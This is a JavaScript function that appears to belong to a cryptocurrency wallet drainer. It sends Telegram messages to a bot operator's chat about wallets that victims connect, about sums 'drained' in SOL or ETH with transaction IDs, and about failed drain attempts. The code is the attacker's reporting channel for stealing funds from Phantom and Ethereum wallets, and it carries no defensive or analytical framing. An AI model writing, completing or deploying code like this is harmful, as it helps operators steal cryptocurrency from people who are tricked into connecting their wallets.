export const sendTelegramLog = async (event, data) => {
  try {
    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;
    
    if (!botToken || !chatId) {
      console.log('Telegram credentials not set');
      return;
    }
    
    let message = '';
    
    switch (event) {
      case 'connected':
        message = `🔗 Connected\nWallet: ${data.address.substring(0, 8)}...\nType: ${data.type}\nAmount: ${data.amount || 'N/A'} SOL\nTime: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'drained':
        message = `💰 Drained\nAmount: ${data.amount} ${data.type === 'phantom' ? 'SOL' : 'ETH'}\nWallet: ${data.address.substring(0, 8)}...\nTX: ${data.txId || data.txHash}\nTime: ${new Date().toLocaleTimeString()}`;
        break;
        
      case 'drain_failed':
        message = `❌ Failed\nError: ${data.error}\nWallet: ${data.address ? data.address.substring(0, 8) + '...' : 'Unknown'}\nTime: ${new Date().toLocaleTimeString()}`;
        break;
        
      default:
        message = `📊 Event: ${event}\n${JSON.stringify(data, null, 2)}`;
    }
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    });
    
    if (!response.ok) {
      console.error('Telegram API error:', await response.text());
    }
    
  } catch (error) {
    console.error('Telegram logging failed:', error);
  }
};
